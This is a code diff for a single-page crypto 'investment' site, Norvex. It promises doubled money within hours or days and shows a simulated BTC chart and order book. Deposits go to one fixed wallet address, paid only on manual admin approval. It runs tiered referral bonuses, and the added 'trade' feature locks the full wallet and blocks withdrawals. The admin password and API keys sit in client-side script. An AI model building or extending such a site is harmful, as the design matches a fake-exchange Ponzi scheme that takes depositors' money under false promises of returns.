@@ -12,9 +12,9 @@
 body{font-family:Inter,system-ui,sans-serif;background:#07140e;color:#f5edd0}
 .serif{font-family:Cinzel,serif}.gold-border{border:1px solid #d4af37}
 .tick-up{color:#3ddc84}.tick-down{color:#ff5d6c}
-.candle-col{width:7px;margin:0 2px;height:100%;display:flex;flex-direction:column;justify-content:flex-end;align-items:center}
-.wick{width:1px}.body{width:6px;border-radius:1px}
-.tape-row,.ob-row{display:flex;justify-content:space-between;font-variant-numeric:tabular-nums;padding:2px 0;font-size:11px}
+.candle-col{width:6px;margin:0 1px;height:100%;display:flex;flex-direction:column;justify-content:flex-end;align-items:center}
+.wick{width:1px}.body{width:5px;border-radius:1px}
+.tape-row,.ob-row{display:flex;justify-content:space-between;font-variant-numeric:tabular-nums;padding:2px 0;font-size:11px;font-family:ui-monospace,monospace}
 input,select{background:#0a1c12;border:1px solid #2a5a3a;color:#f5edd0}
 .logo-n{border-radius:9999px;background:#0d3a24;border:2px solid #d4af37;display:flex;align-items:center;justify-content:center;flex-shrink:0}
 .logo-n:after{content:"N";font-family:Cinzel,serif;font-weight:700;color:#d4af37;font-size:70%}
@@ -40,9 +40,8 @@ a[href*="netlify.com"]{display:none!important}
 <button type="button" onclick="showScreen('login')" class="gold-border text-nx-gold px-6 py-3 rounded-full">Login</button>
 </div></div>
 <div class="bg-nx-card gold-border rounded-2xl p-5">
-<div class="flex justify-center mb-2"><div class="logo-n w-14 h-14"></div></div>
-<div class="flex justify-between text-xs mb-2"><span class="text-nx-gold">LIVE · BTC/USDT</span><span id="hero-btc" class="tick-up">$68,432</span></div>
-<div id="hero-chart" class="h-36 flex items-end bg-black/30 rounded-lg px-2 py-2"></div>
+<div class="flex justify-between text-xs mb-2"><span class="text-nx-gold">BTC/USDT</span><span id="hero-btc" class="tick-up font-mono">68432.21</span></div>
+<div id="hero-chart" class="h-36 flex items-end bg-black/40 rounded-lg px-1 py-2"></div>
 </div></div>
 <h2 class="serif text-center text-nx-gold text-2xl mt-12 mb-6">Investment Plans</h2>
 <div class="grid sm:grid-cols-2 lg:grid-cols-4 gap-4">
@@ -59,14 +58,13 @@ a[href*="netlify.com"]{display:none!important}
 <input id="su-email" type="email" class="w-full rounded-lg px-3 py-2 mb-3" placeholder="Email"/>
 <input id="su-phone" class="w-full rounded-lg px-3 py-2 mb-3" placeholder="Phone"/>
 <input id="su-pass" type="password" class="w-full rounded-lg px-3 py-2 mb-3" placeholder="Password"/>
-<input id="su-ref" class="w-full rounded-lg px-3 py-2 mb-4" placeholder="Referral NV-XXXX"/>
+<input id="su-ref" class="w-full rounded-lg px-3 py-2 mb-4" placeholder="Referral (auto from link)"/>
 <button type="button" onclick="sendOtp()" class="w-full bg-nx-gold text-nx-bg font-semibold py-3 rounded-full">Send OTP</button>
 </div></section>
 <section id="screen-otp" class="hidden max-w-md mx-auto px-4 py-10">
 <div class="bg-nx-card gold-border rounded-2xl p-6">
 <h2 class="serif text-2xl text-nx-gold text-center">Verify OTP</h2>
 <p class="text-center text-xs mb-3">Sent to <span id="otp-email-label" class="text-nx-gold"></span></p>
-<p id="otp-status" class="text-center text-xs text-emerald-400 mb-3 hidden"></p>
 <input id="su-otp" maxlength="6" class="w-full rounded-lg px-3 py-3 mb-4 text-center tracking-[0.5em] text-xl"/>
 <button type="button" onclick="verifyOtp()" class="w-full bg-nx-gold text-nx-bg font-semibold py-3 rounded-full">Verify</button>
 </div></section>
@@ -101,9 +99,9 @@ a[href*="netlify.com"]{display:none!important}
 <div class="overflow-x-auto bg-nx-card gold-border rounded-xl"><div class="p-3 text-nx-gold">Deposits</div>
 <table class="w-full text-xs"><thead class="text-nx-gold2 border-y border-nx-line"><tr><th class="p-2 text-left">User</th><th>Amt</th><th>Hash</th><th>Status</th><th>Action</th></tr></thead><tbody id="ad-dep-rows"></tbody></table></div>
 <div class="overflow-x-auto bg-nx-card gold-border rounded-xl"><div class="p-3 text-nx-gold">Withdrawals</div>
-<table class="w-full text-xs"><thead class="text-nx-gold2 border-y border-nx-line"><tr><th class="p-2 text-left">User</th><th>Amt</th><th>Fee</th><th>Net</th><th>Addr</th><th>Status</th><th>Action</th></tr></thead><tbody id="ad-wd-rows"></tbody></table></div>
+<table class="w-full text-xs"><thead class="text-nx-gold2 border-y border-nx-line"><tr><th class="p-2 text-left">User</th><th>Amt</th><th>Net</th><th>Addr</th><th>Status</th><th>Action</th></tr></thead><tbody id="ad-wd-rows"></tbody></table></div>
 <div class="overflow-x-auto bg-nx-card gold-border rounded-xl"><div class="p-3 text-nx-gold">Users</div>
-<table class="w-full text-xs"><thead class="text-nx-gold2 border-y border-nx-line"><tr><th class="p-2 text-left">User</th><th>Email</th><th>Phone</th><th>Bal</th><th>Team</th></tr></thead><tbody id="ad-user-rows"></tbody></table></div>
+<table class="w-full text-xs"><thead class="text-nx-gold2 border-y border-nx-line"><tr><th class="p-2 text-left">User</th><th>Email</th><th>Bal</th><th>Team</th></tr></thead><tbody id="ad-user-rows"></tbody></table></div>
 </main></div>
 
 <div id="dash-wrap" class="hidden min-h-screen">
@@ -126,20 +124,29 @@ a[href*="netlify.com"]{display:none!important}
 <div class="bg-nx-card gold-border rounded-xl p-4"><div class="text-[11px] text-nx-gold2">WALLET</div><div class="serif text-2xl text-nx-gold">$<span id="bal">0.00</span></div></div>
 <div class="bg-nx-card gold-border rounded-xl p-4"><div class="text-[11px] text-nx-gold2">PROFIT</div><div class="serif text-2xl text-nx-gold">$<span id="profit-home">0.00</span></div></div>
 <div class="bg-nx-card gold-border rounded-xl p-4"><div class="text-[11px] text-nx-gold2">TEAM</div><div class="serif text-2xl text-nx-gold" id="team-size">0</div></div>
-<div class="bg-nx-card gold-border rounded-xl p-4"><div class="text-[11px] text-nx-gold2">REF</div><div class="serif text-2xl text-nx-gold">$<span id="ref-bonus">0.00</span></div></div>
+<div class="bg-nx-card gold-border rounded-xl p-4"><div class="text-[11px] text-nx-gold2">DIRECT BONUS</div><div class="serif text-2xl text-nx-gold">$<span id="ref-bonus">0.00</span></div></div>
 </div>
 <div class="bg-nx-card gold-border rounded-xl p-4 mt-4">
-<div class="flex justify-between text-xs mb-2"><span class="text-nx-gold">TRADE TIMER</span><span id="trade-left" class="text-nx-gold2">—</span></div>
-<div id="dash-chart" class="h-36 flex items-end bg-black/30 rounded-lg px-2 py-2"></div>
+<div class="flex justify-between text-xs mb-1">
+<span class="text-nx-gold font-mono">BTC/USDT</span>
+<span id="home-px" class="tick-up font-mono">68432.21</span>
+</div>
+<div class="text-[10px] text-amber-100/50 mb-2">Vol <span id="home-vol">1,284.20</span> BTC · 24h <span id="home-chg" class="tick-up">+1.24%</span></div>
+<div id="dash-chart" class="h-40 flex items-end bg-black/40 rounded-lg px-1 py-2"></div>
+<div class="flex justify-between items-center mt-3">
+<div class="text-xs">Timer <span id="trade-left" class="text-nx-gold">—</span></div>
+<button type="button" onclick="openTradeBox()" class="bg-nx-gold text-nx-bg font-semibold px-5 py-2 rounded-full text-sm">Trade</button>
+</div>
+<p class="text-[11px] text-amber-100/60 mt-2">Full wallet balance will be used for this trade.</p>
 <div id="plan-bars" class="text-xs mt-3"></div>
 </div>
 </section>
 <section id="tab-plans" class="hidden">
 <div class="grid sm:grid-cols-2 gap-3">
-<div class="bg-nx-card gold-border rounded-xl p-4">$20 · 24h · 2X $40</div>
-<div class="bg-nx-card gold-border rounded-xl p-4">$50 · 72h · 2X $100</div>
-<div class="bg-nx-card gold-border rounded-xl p-4">$100 · 10d · 2X</div>
-<div class="bg-nx-card gold-border rounded-xl p-4">$100k · 10d · 2X</div>
+<div class="bg-nx-card gold-border rounded-xl p-4">$20 · 24 Hours · 2X</div>
+<div class="bg-nx-card gold-border rounded-xl p-4">$50 · 72 Hours · 2X</div>
+<div class="bg-nx-card gold-border rounded-xl p-4">$100 · 10 Days · 2X</div>
+<div class="bg-nx-card gold-border rounded-xl p-4">$100k · 10 Days · 2X</div>
 </div></section>
 <section id="tab-deposit" class="hidden">
 <div class="bg-nx-card gold-border rounded-xl p-4">
@@ -156,13 +163,26 @@ a[href*="netlify.com"]{display:none!important}
 </section>
 <section id="tab-trade" class="hidden">
 <div class="bg-nx-card gold-border rounded-xl p-4">
-<div class="text-[10px] text-nx-gold2">NORVEX SPOT · BTC/USDT</div>
+<div class="flex justify-between"><div>
+<div class="text-[10px] text-nx-gold2">SPOT · BTC/USDT</div>
 <div id="trade-price" class="tick-up font-semibold text-2xl font-mono">68432.21</div>
-<div class="text-[11px]">Mark <span id="mark-px"></span> Last <span id="last-px"></span></div>
-<div id="trade-chart" class="h-52 flex items-end bg-black/40 rounded-lg mt-2"></div>
+<div class="text-[11px] font-mono">Mark <span id="mark-px"></span> · Last <span id="last-px"></span></div>
+</div>
+<div class="text-right text-xs font-mono"><div id="chg" class="tick-up"></div><div class="text-amber-100/50">Vol <span id="vol24"></span></div></div>
+</div>
+<div id="trade-chart" class="h-52 flex items-end bg-black/40 rounded-lg mt-2 px-1 py-2"></div>
 <div class="grid md:grid-cols-2 gap-3 mt-3">
-<div class="bg-black/30 rounded-lg p-3"><div class="text-[10px] text-nx-gold mb-2">ORDER BOOK</div><div id="asks"></div><div id="spread" class="text-center text-xs text-nx-gold py-1"></div><div id="bids"></div></div>
-<div class="bg-black/30 rounded-lg p-3"><div class="text-[10px] text-nx-gold mb-2">TRADES</div><div id="tape"></div></div>
+<div class="bg-black/30 rounded-lg p-3">
+<div class="text-[10px] text-nx-gold mb-2">ORDER BOOK</div>
+<div class="ob-row text-amber-100/40"><span>PRICE</span><span>SIZE</span></div>
+<div id="asks"></div>
+<div id="spread" class="text-center text-xs text-nx-gold py-1 font-mono"></div>
+<div id="bids"></div>
+</div>
+<div class="bg-black/30 rounded-lg p-3">
+<div class="text-[10px] text-nx-gold mb-2">RECENT TRADES</div>
+<div id="tape"></div>
+</div>
 </div></div>
 </section>
 <section id="tab-profit" class="hidden">
@@ -184,13 +204,16 @@ a[href*="netlify.com"]{display:none!important}
 </section>
 <section id="tab-team" class="hidden">
 <div class="bg-nx-card gold-border rounded-xl p-4 mb-3">
+<div class="text-[11px] text-nx-gold2">REFERRAL CODE</div>
 <b id="ref-code" class="text-nx-gold">NV-USER</b>
 <button type="button" onclick="copyRef()" class="text-[10px] gold-border px-2 py-0.5 rounded-full text-nx-gold">Copy Code</button>
-<div id="ref-link" class="text-[10px] break-all mt-2"></div>
+<div class="text-[11px] text-nx-gold2 mt-3">REFERRAL LINK</div>
+<div id="ref-link" class="text-[10px] break-all mt-1"></div>
 <button type="button" onclick="copyRefLink()" class="text-[10px] gold-border px-2 py-1 rounded-full text-nx-gold mt-2">Copy Link</button>
+<p class="text-[11px] mt-2 text-amber-100/60">Direct joining bonus 5% on each direct deposit only.</p>
 </div>
 <div class="overflow-x-auto bg-nx-card gold-border rounded-xl">
-<table class="w-full text-xs"><thead class="text-nx-gold border-b border-nx-line"><tr><th class="p-3 text-left">Refs</th><th class="p-3">Bonus</th><th class="p-3">Level</th></tr></thead>
+<table class="w-full text-xs"><thead class="text-nx-gold border-b border-nx-line"><tr><th class="p-3 text-left">Direct refs</th><th class="p-3">Bonus</th><th class="p-3">Level</th></tr></thead>
 <tbody>
 <tr class="border-b border-nx-line/50"><td class="p-3">5</td><td class="p-3 text-center">$20</td><td class="p-3 text-center">3</td></tr>
 <tr class="border-b border-nx-line/50"><td class="p-3">15</td><td class="p-3 text-center">$80</td><td class="p-3 text-center">8</td></tr>
@@ -199,7 +222,7 @@ a[href*="netlify.com"]{display:none!important}
 <tr class="border-b border-nx-line/50"><td class="p-3">500</td><td class="p-3 text-center">$450</td><td class="p-3 text-center">37</td></tr>
 <tr><td class="p-3">1000</td><td class="p-3 text-center">$800</td><td class="p-3 text-center">50</td></tr>
 </tbody></table></div>
-<div class="bg-nx-card gold-border rounded-xl p-4 mt-3"><div class="text-xs text-nx-gold mb-2">TEAM MEMBERS</div><div id="team-list" class="text-xs"></div></div>
+<div class="bg-nx-card gold-border rounded-xl p-4 mt-3"><div class="text-xs text-nx-gold mb-2">DIRECT MEMBERS</div><div id="team-list" class="text-xs"></div></div>
 </section>
 </main></div>
 
@@ -210,6 +233,14 @@ a[href*="netlify.com"]{display:none!important}
 <p class="text-sm mt-2" id="pop-msg"></p>
 <button type="button" id="pop-ok" onclick="closePop()" class="mt-5 bg-nx-gold text-nx-bg px-6 py-2 rounded-full">OK</button>
 </div></div>
+<div id="trade-box" class="hidden fixed inset-0 bg-black/70 z-50 flex items-center justify-center p-4">
+<div class="bg-nx-card gold-border rounded-2xl p-6 max-w-sm w-full">
+<h3 class="serif text-nx-gold text-xl text-center">Start Trade</h3>
+<p class="text-xs text-center mt-2 mb-3">Full wallet balance will be used for this trade.</p>
+<div class="text-center serif text-2xl text-nx-gold mb-4">$<span id="trade-amt-show">0.00</span></div>
+<button type="button" onclick="startTrade()" class="w-full bg-nx-gold text-nx-bg font-semibold py-3 rounded-full">Confirm Trade</button>
+<button type="button" onclick="closeTradeBox()" class="w-full mt-2 gold-border text-nx-gold py-2 rounded-full">Cancel</button>
+</div></div>
 
 <script>
 const ADDR="0x07CCDCFBB0fa8F84ea673512d5831F0B4a84989E";
@@ -218,7 +249,7 @@ const ADMIN_ID="admin",ADMIN_PASS="Norvex@2026";
 const EMAILJS_PUBLIC="7QnOOVY77lTYJ_jzS",EMAILJS_SERVICE="service_cilo9di",EMAILJS_TEMPLATE="template_az4mmjr";
 if(window.emailjs)emailjs.init({publicKey:EMAILJS_PUBLIC});
 const REF_TIERS=[{n:5,bonus:20},{n:15,bonus:80},{n:40,bonus:150},{n:100,bonus:250},{n:500,bonus:450},{n:1000,bonus:800}];
-let pending=null,candles=[],px=68432.21,openPx=66810.4,tape=[];
+let pending=null,candles=[],px=68432.21,openPx=67120.40,tape=[],volBase=1284.2;
 function users(){try{return JSON.parse(localStorage.getItem(KEY_USERS)||"{}");}catch(e){return{};}}
 function saveUsers(u){localStorage.setItem(KEY_USERS,JSON.stringify(u));}
 function wds(){try{return JSON.parse(localStorage.getItem(KEY_WD)||"[]");}catch(e){return[];}}
@@ -228,7 +259,7 @@ function setSess(s){localStorage.setItem(KEY_SESS,JSON.stringify(s));}
 function showScreen(n){["landing","signup","otp","login","adminlogin"].forEach(function(x){const e=document.getElementById("screen-"+x);if(e)e.classList.toggle("hidden",x!==n);});}
 function findByUser(name){const all=users(),n=(name||"").toLowerCase();const ks=Object.keys(all);for(let i=0;i<ks.length;i++){if((all[ks[i]].username||"").toLowerCase()===n)return all[ks[i]];}return null;}
 function spinMark(){return '<span class="spin" style="width:18px;height:18px;display:inline-block;vertical-align:middle"></span>';}
-function depLabel(d){if(d.status==="PENDING")return spinMark();if(d.status==="REJECTED")return "Cancelled";if(d.paid||d.status==="COMPLETED"||d.status==="APPROVED")return "Successful";return "";}
+function depLabel(d){if(d.status==="PENDING")return spinMark();if(d.status==="REJECTED")return "Cancelled";return "Successful";}
 function wdLabel(w){if(w.status==="PENDING")return spinMark();if(w.status==="APPROVED")return "Approved";if(w.status==="REJECTED")return "Cancelled";return "";}
 async function sendOtp(){
 const username=document.getElementById("su-user").value.trim();
@@ -241,8 +272,7 @@ if(findByUser(username)){pop("Error","Username already taken");return;}
 const otp=String(Math.floor(100000+Math.random()*900000));
 pending={username:username,email:email,phone:phone,password:password,otp:otp,refIn:refIn};
 document.getElementById("otp-email-label").textContent=email;
-try{await emailjs.send(EMAILJS_SERVICE,EMAILJS_TEMPLATE,{to_email:email,otp_code:otp,user_name:username});
-document.getElementById("otp-status").textContent="OTP sent";document.getElementById("otp-status").classList.remove("hidden");showScreen("otp");}
+try{await emailjs.send(EMAILJS_SERVICE,EMAILJS_TEMPLATE,{to_email:email,otp_code:otp,user_name:username});showScreen("otp");}
 catch(e){pending=null;pop("Error","OTP failed");}
 }
 function applyRefTiers(u){u.claimedTiers=u.claimedTiers||[];const size=(u.team&&u.team.length)||0;REF_TIERS.forEach(function(t){if(size>=t.n&&u.claimedTiers.indexOf(t.n)<0){u.balance=Number(u.balance||0)+t.bonus;u.refBonus=Number(u.refBonus||0)+t.bonus;u.claimedTiers.push(t.n);}});}
@@ -256,11 +286,21 @@ for(let i=0;i<sp.team.length;i++){if(sp.team[i].email===newEmail)return;}
 sp.team.push({username:p.username,email:newEmail,phone:p.phone,time:new Date().toLocaleString()});
 sp.teamSize=sp.team.length;applyRefTiers(sp);all[sp.email]=sp;
 }
+function payDirectBonus(all,user,amt){
+const code=(user.sponsor||"").toUpperCase();if(!code)return;
+const ks=Object.keys(all);let sp=null;
+for(let i=0;i<ks.length;i++){if((all[ks[i]].refCode||"").toUpperCase()===code){sp=all[ks[i]];break;}}
+if(!sp||sp.email===user.email)return;
+const b=+(amt*0.05).toFixed(2);
+sp.balance=Number(sp.balance||0)+b;
+sp.refBonus=Number(sp.refBonus||0)+b;
+all[sp.email]=sp;
+}
 function verifyOtp(){
 const code=document.getElementById("su-otp").value.trim();
 if(!pending||code!==pending.otp){pop("Error","Invalid OTP");return;}
 const u=users();
-u[pending.email]={username:pending.username,email:pending.email,phone:pending.phone,password:pending.password,balance:0,profit:0,deposits:[],wdAddress:"",team:[],teamSize:0,refBonus:0,claimedTiers:[],sponsor:pending.refIn||"",refCode:"NV-"+pending.username.toUpperCase().replace(/\s+/g,"").slice(0,8)};
+u[pending.email]={username:pending.username,email:pending.email,phone:pending.phone,password:pending.password,balance:0,profit:0,deposits:[],trade:null,wdAddress:"",team:[],teamSize:0,refBonus:0,claimedTiers:[],sponsor:pending.refIn||"",refCode:"NV-"+pending.username.toUpperCase().replace(/\s+/g,"").slice(0,8)};
 attachReferral(u,pending.email,pending);saveUsers(u);setSess({email:pending.email});pending=null;enterDash();
 }
 function doLogin(){const name=document.getElementById("li-user").value.trim();const pass=document.getElementById("li-pass").value;const u=findByUser(name);if(!u||u.password!==pass){pop("Error","Wrong username or password");return;}setSess({email:u.email});enterDash();}
@@ -271,38 +311,51 @@ function renderAdmin(){
 const list=Object.values(users());document.getElementById("ad-users").textContent=list.length;
 let wal=0,pend=0;list.forEach(function(u){wal+=Number(u.balance||0);(u.deposits||[]).forEach(function(d){if(d.status==="PENDING")pend++;});});
 document.getElementById("ad-pend").textContent=pend;document.getElementById("ad-wallets").textContent="$"+wal.toFixed(2);
-document.getElementById("ad-user-rows").innerHTML=list.map(function(u){return '<tr class="border-b border-nx-line/40"><td class="p-2">'+u.username+'</td><td class="p-2">'+u.email+'</td><td class="p-2">'+(u.phone||"")+'</td><td class="p-2">$'+Number(u.balance||0).toFixed(2)+'</td><td class="p-2">'+((u.team&&u.team.length)||0)+'</td></tr>';}).join("")||'<tr><td class="p-3" colspan="5">None</td></tr>';
+document.getElementById("ad-user-rows").innerHTML=list.map(function(u){return '<tr class="border-b border-nx-line/40"><td class="p-2">'+u.username+'</td><td class="p-2">'+u.email+'</td><td class="p-2">$'+Number(u.balance||0).toFixed(2)+'</td><td class="p-2">'+((u.team&&u.team.length)||0)+'</td></tr>';}).join("")||'<tr><td class="p-3" colspan="4">None</td></tr>';
 document.getElementById("ad-dep-rows").innerHTML=allDeps().map(function(x){const d=x.d;const act=d.status==="PENDING"?'<button type="button" onclick="adminDep(\''+x.email+'\','+x.i+',\'APPROVED\')" class="text-emerald-400">Approve</button> <button type="button" onclick="adminDep(\''+x.email+'\','+x.i+',\'REJECTED\')" class="text-red-400">Reject</button>':"—";return '<tr class="border-b border-nx-line/40"><td class="p-2">'+x.user+'</td><td class="p-2">$'+d.amount+'</td><td class="p-2 break-all">'+d.hash+'</td><td class="p-2">'+d.status+'</td><td class="p-2">'+act+'</td></tr>';}).join("")||'<tr><td class="p-3" colspan="5">None</td></tr>';
-document.getElementById("ad-wd-rows").innerHTML=wds().map(function(w,i){return '<tr class="border-b border-nx-line/40"><td class="p-2">'+w.user+'<br/>'+w.email+'</td><td class="p-2">$'+w.amount+'</td><td class="p-2">$'+w.fee+'</td><td class="p-2">$'+w.net+'</td><td class="p-2 break-all">'+w.address+'</td><td class="p-2">'+w.status+'</td><td class="p-2">'+(w.status==="PENDING"?'<button type="button" onclick="adminWd('+i+',\'APPROVED\')" class="text-emerald-400">Approve</button> <button type="button" onclick="adminWd('+i+',\'REJECTED\')" class="text-red-400">Reject</button>':"—")+'</td></tr>';}).join("")||'<tr><td class="p-3" colspan="7">None</td></tr>';
+document.getElementById("ad-wd-rows").innerHTML=wds().map(function(w,i){return '<tr class="border-b border-nx-line/40"><td class="p-2">'+w.user+'</td><td class="p-2">$'+w.amount+'</td><td class="p-2">$'+w.net+'</td><td class="p-2 break-all">'+w.address+'</td><td class="p-2">'+w.status+'</td><td class="p-2">'+(w.status==="PENDING"?'<button type="button" onclick="adminWd('+i+',\'APPROVED\')" class="text-emerald-400">Approve</button> <button type="button" onclick="adminWd('+i+',\'REJECTED\')" class="text-red-400">Reject</button>':"—")+'</td></tr>';}).join("")||'<tr><td class="p-3" colspan="6">None</td></tr>';
 }
 function adminDep(email,i,st){
 const all=users();const u=all[email];if(!u||!u.deposits[i]||u.deposits[i].status!=="PENDING")return;
 const d=u.deposits[i];d.status=st;
-if(st==="APPROVED"){d.start=Date.now();d.end=Date.now()+d.hours*3600*1000;d.paid=false;u.balance=Number(u.balance||0)+Number(d.amount||0);}
+if(st==="APPROVED"){u.balance=Number(u.balance||0)+Number(d.amount||0);payDirectBonus(all,u,Number(d.amount||0));}
 all[email]=u;saveUsers(all);renderAdmin();
 }
 function adminWd(i,st){const all=wds();const w=all[i];if(!w||w.status!=="PENDING")return;const us=users();const u=us[w.email];if(st==="REJECTED"&&u){u.balance=Number(u.balance||0)+Number(w.amount);us[w.email]=u;saveUsers(us);}w.status=st;saveWds(all);renderAdmin();}
 function currentUser(){const s=sess();return s&&s.email?users()[s.email]||null:null;}
 function persistUser(u){const all=users();all[u.email]=u;saveUsers(all);}
-function enterDash(){const u=currentUser();if(!u){logout();return;}document.getElementById("auth-wrap").classList.add("hidden");document.getElementById("dash-wrap").classList.remove("hidden");drawUser();openTab("home");if(window._t)clearInterval(window._t);window._t=setInterval(function(){if(currentUser())drawUser();},1000);}
+function enterDash(){if(!currentUser()){logout();return;}document.getElementById("auth-wrap").classList.add("hidden");document.getElementById("dash-wrap").classList.remove("hidden");drawUser();openTab("home");if(window._t)clearInterval(window._t);window._t=setInterval(function(){if(currentUser())drawUser();},1000);}
 function planFor(amt){if(amt>=100)return{label:"10 Days",hours:240};if(amt>=50)return{label:"72 Hours",hours:72};return{label:"24 Hours",hours:24};}
 function fmtLeft(ms){if(ms<=0)return"00:00:00";const s=Math.floor(ms/1000),d=Math.floor(s/86400),h=Math.floor((s%86400)/3600),m=Math.floor((s%3600)/60),sec=s%60,p=function(n){return String(n).padStart(2,"0");};return(d?d+"d ":"")+p(h)+":"+p(m)+":"+p(sec);}
-function endPlans(u){
-if(!u||!u.deposits)return;
-let ch=false;
-u.deposits.forEach(function(d){
-if(d.status==="APPROVED"&&!d.paid&&d.end&&Date.now()>=d.end){
-const inv=Number(d.amount)||0;
-u.balance=Number(u.balance||0)+inv;
+function endTrade(u){
+if(!u||!u.trade||u.trade.paid)return;
+if(Date.now()>=u.trade.end){
+const inv=Number(u.trade.amount)||0;
+u.balance=inv*2;
 u.profit=Number(u.profit||0)+inv*2;
-d.paid=true;d.status="COMPLETED";ch=true;
-}});
-if(ch)persistUser(u);
+u.trade.paid=true;
+persistUser(u);
+}
 }
 function refLink(){const u=currentUser();return u?location.origin+"/?ref="+encodeURIComponent(u.refCode):location.origin+"/";}
-function copyRefLink(){navigator.clipboard.writeText(refLink());pop("Copied","Link copied");}
+function copyRefLink(){navigator.clipboard.writeText(refLink());pop("Copied","Referral link copied");}
+function openTradeBox(){
+const u=currentUser();if(!u)return;
+if(u.trade&&!u.trade.paid){pop("Trade","A trade is already running");return;}
+if(Number(u.balance||0)<=0){pop("Trade","Deposit required");return;}
+document.getElementById("trade-amt-show").textContent=Number(u.balance).toFixed(2);
+document.getElementById("trade-box").classList.remove("hidden");
+}
+function closeTradeBox(){document.getElementById("trade-box").classList.add("hidden");}
+function startTrade(){
+const u=currentUser();if(!u)return;
+const amt=Number(u.balance||0);if(amt<=0){closeTradeBox();return;}
+const plan=planFor(amt);
+u.trade={amount:amt,start:Date.now(),end:Date.now()+plan.hours*3600*1000,hours:plan.hours,label:plan.label,paid:false};
+persistUser(u);closeTradeBox();drawUser();pop("Trade Successful","Full wallet $"+amt.toFixed(2)+" is now in trade.");
+}
 function drawUser(){
-const u=currentUser();if(!u)return;endPlans(u);
+const u=currentUser();if(!u)return;endTrade(u);
 document.getElementById("bal").textContent=Number(u.balance||0).toFixed(2);
 document.getElementById("team-size").textContent=(u.team&&u.team.length)||0;
 document.getElementById("ref-bonus").textContent=Number(u.refBonus||0).toFixed(2);
@@ -311,18 +364,23 @@ const rl=document.getElementById("ref-link");if(rl)rl.textContent=refLink();
 const pf=Number(u.profit||0).toFixed(2);
 const ph=document.getElementById("profit-home");if(ph)ph.textContent=pf;
 const pt=document.getElementById("profit-total");if(pt)pt.textContent=pf;
-const active=(u.deposits||[]).filter(function(d){return d.status==="APPROVED"&&!d.paid;});
-const tleft=document.getElementById("trade-left");if(tleft)tleft.textContent=active.length?fmtLeft(active[0].end-Date.now()):"—";
+const tleft=document.getElementById("trade-left");
+if(tleft)tleft.textContent=(u.trade&&!u.trade.paid)?fmtLeft(u.trade.end-Date.now()):"—";
 const bars=document.getElementById("plan-bars");
-if(bars)bars.innerHTML=(u.deposits||[]).filter(function(d){return d.status!=="REJECTED";}).map(function(d){const extra=(d.status==="APPROVED"&&!d.paid)?" · "+fmtLeft(d.end-Date.now()):"";return '<div class="py-2 border-b border-nx-line/40">$'+d.amount+" · "+depLabel(d)+extra+"</div>";}).join("")||"";
+if(bars){
+let html="";
+if(u.trade&&!u.trade.paid)html+='<div class="py-2">Trade $'+u.trade.amount+' · '+u.trade.label+' · '+fmtLeft(u.trade.end-Date.now())+"</div>";
+(u.deposits||[]).forEach(function(d){html+='<div class="py-2">Deposit $'+d.amount+" · "+depLabel(d)+"</div>";});
+bars.innerHTML=html;
+}
 const pl=document.getElementById("profit-list");
-if(pl)pl.innerHTML=(u.deposits||[]).map(function(d){return '<div class="py-2">$'+d.amount+" → $"+(d.amount*2)+" · "+depLabel(d)+"</div>";}).join("")||"";
+if(pl)pl.innerHTML=(u.trade?'<div class="py-2">Trade $'+u.trade.amount+(u.trade.paid?" · Completed":" · Running")+"</div>":"");
 const h=document.getElementById("dep-hist");
-if(h)h.innerHTML=(u.deposits||[]).map(function(d){return '<div class="py-2 flex items-center gap-2">$'+d.amount+" · "+depLabel(d)+"</div>";}).join("")||"";
+if(h)h.innerHTML=(u.deposits||[]).map(function(d){return '<div class="py-2">$'+d.amount+" · "+depLabel(d)+"</div>";}).join("")||"";
 const tml=document.getElementById("team-list");if(tml){const mem=u.team||[];tml.innerHTML=mem.map(function(m,i){return '<div class="py-2">'+(i+1)+". "+m.username+" · "+m.email+"</div>";}).join("")||"";}
 const s=document.getElementById("wd-saved");if(s)s.textContent=u.wdAddress||"Not added";
 const wh=document.getElementById("wd-hist");
-if(wh)wh.innerHTML=wds().filter(function(w){return w.email===u.email;}).map(function(w){return '<div class="py-2 flex items-center gap-2">$'+w.amount+" · "+wdLabel(w)+"</div>";}).join("")||"";
+if(wh)wh.innerHTML=wds().filter(function(w){return w.email===u.email;}).map(function(w){return '<div class="py-2">$'+w.amount+" · "+wdLabel(w)+"</div>";}).join("")||"";
 }
 function openTab(id){["home","plans","deposit","trade","profit","withdraw","team"].forEach(function(t){document.getElementById("tab-"+t).classList.toggle("hidden",t!==id);});document.querySelectorAll(".tab-btn").forEach(function(b){b.classList.toggle("gold-border",b.getAttribute("data-tab")===id);b.classList.toggle("text-nx-gold",b.getAttribute("data-tab")===id);});}
 function copyAddr(){navigator.clipboard.writeText(ADDR).then(function(){document.getElementById("copy-msg").classList.remove("hidden");setTimeout(function(){document.getElementById("copy-msg").classList.add("hidden");},1500);});}
@@ -331,14 +389,16 @@ function submitHash(){
 const u=currentUser(),amt=Number(document.getElementById("dep-amt").value),hash=document.getElementById("dep-hash").value.trim();
 if(!amt||amt<20){pop("Error","Minimum $20");return;}
 if(hash.length<10){pop("Error","Enter transaction hash");return;}
-const plan=planFor(amt);u.deposits=u.deposits||[];
-u.deposits.unshift({amount:amt,hash:hash,time:new Date().toLocaleString(),label:plan.label,hours:plan.hours,status:"PENDING",paid:false});
-persistUser(u);drawUser();document.getElementById("dep-amt").value="";document.getElementById("dep-hash").value="";popSpin();
+u.deposits=u.deposits||[];
+u.deposits.unshift({amount:amt,hash:hash,time:new Date().toLocaleString(),status:"PENDING"});
+persistUser(u);drawUser();document.getElementById("dep-amt").value="";document.getElementById("dep-hash").value="";
+pop("Successfully","Hash submitted.");
 }
 function saveAddr(){const u=currentUser(),a=document.getElementById("wd-addr").value.trim();if(a.indexOf("0x")!==0||a.length<20){pop("Error","Enter BEP20 address");return;}u.wdAddress=a;persistUser(u);drawUser();pop("Saved","");}
 function calcFee(){const amt=Number(document.getElementById("wd-amt").value)||0;document.getElementById("wd-fee").textContent=(amt*0.05).toFixed(2);document.getElementById("wd-net").textContent=(amt*0.95).toFixed(2);}
 function requestWd(){
 const u=currentUser();if(!u.wdAddress){pop("Error","Add address");return;}
+if(u.trade&&!u.trade.paid){pop("Error","Trade is running");return;}
 const amt=Number(document.getElementById("wd-amt").value);
 if(!amt||amt>Number(u.balance||0)){pop("Error","Check amount");return;}
 const fee=+(amt*0.05).toFixed(2),net=+(amt*0.95).toFixed(2);
@@ -349,26 +409,43 @@ saveWds(all);document.getElementById("wd-amt").value="";calcFee();drawUser();pop
